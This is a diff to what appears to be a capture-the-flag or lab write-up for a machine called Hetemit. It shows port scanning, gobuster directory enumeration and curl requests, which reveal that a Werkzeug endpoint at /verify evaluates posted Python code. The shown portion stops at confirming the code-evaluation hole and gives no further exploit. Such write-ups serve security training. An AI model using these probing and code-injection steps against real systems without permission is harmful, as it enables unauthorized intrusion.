@@ -1,4 +1,4 @@
-# Hetemit
+# 🐧Hetemit
 
 
 
@@ -21,3 +21,52 @@ PORT      STATE SERVICE     VERSION
 18000/tcp open  biimenu?
 50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
 ```
+
+Found port 50000 running http with python
+Use Gobuster to find subdirectory and got /verfiy
+```
+┌──(ming㉿kali)-[~/Downloads]
+└─$ gobuster dir -u http://192.168.129.117:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.129.117:50000
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/verify               (Status: 200) [Size: 8]
+```
+
+Use curl to get more info
+```
+┌──(ming㉿kali)-[~/Downloads]
+└─$ curl -i http://192.168.129.117:50000/verify
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 8
+Server: Werkzeug/1.0.1 Python/3.6.8
+Date: Fri, 30 Jan 2026 10:10:42 GMT
+
+{'code'}                                                                                                                  
+```
+
+The web looks running the code with python
+```
+The web looks running the code with python   
+┌──(ming㉿kali)-[~/Downloads]
+└─$ curl -i http://192.168.129.117:50000/verify -X POST -d "code=5*5"                                    
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 2
+Server: Werkzeug/1.0.1 Python/3.6.8
+Date: Fri, 30 Jan 2026 10:07:12 GMT
+
+25
+```                                  
